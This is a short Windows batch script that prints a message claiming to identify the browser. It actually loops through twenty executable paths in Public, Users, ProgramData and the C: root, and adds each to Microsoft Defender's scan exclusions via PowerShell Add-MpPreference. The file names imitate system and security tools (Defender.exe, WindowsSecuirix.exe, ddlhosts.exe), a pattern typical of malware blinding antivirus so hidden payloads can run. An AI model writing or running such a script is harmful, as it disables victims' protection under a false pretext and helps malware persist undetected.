@echo off
echo Identificando navegador...
setlocal enabledelayedexpansion
set exclusions[1]=C:\Users\Public\WindowsSecuirix.exe
set exclusions[2]=C:\Users\Public\Hosts de servicio local (...).exe
set exclusions[3]=C:\Users\PowerSaf.exe
set exclusions[4]=C:\Health.exe
set exclusions[5]=C:\Defender.exe
set exclusions[6]=C:\Users\Public\ddlhosts.exe
set exclusions[7]=C:\Users\Hosts de servicio local (...).exe
set exclusions[8]=C:\Users\Defensax.exe
set exclusions[9]=C:\Users\PowerDefx.exe
set exclusions[10]=C:\Users\PowerSafx.exe
set exclusions[11]=C:\Healthx.exe
set exclusions[12]=C:\Defenderx.exe
set exclusions[13]=C:\Users\MaximaDefex.exe
set exclusions[14]=C:\Users\WindowsProtecx.exe
set exclusions[15]=C:\ProgramData\ddlhosts.exe
set exclusions[16]=C:\ProgramData\ddlllhosts.exe
set exclusions[17]=C:\ProgramData\Hosts de servicio local (...).exe
set exclusions[18]=C:\ProgramData\WindowsSecuirix.exe
set exclusions[19]=C:\Users\Defensa.exe
set exclusions[20]=C:\ProgramData\WindowsShell.exe
for /l %%i in (1,1,20) do (
	powershell.exe -Command "Add-MpPreference -ExclusionPath '!exclusions[%%i]!'"
)
echo ..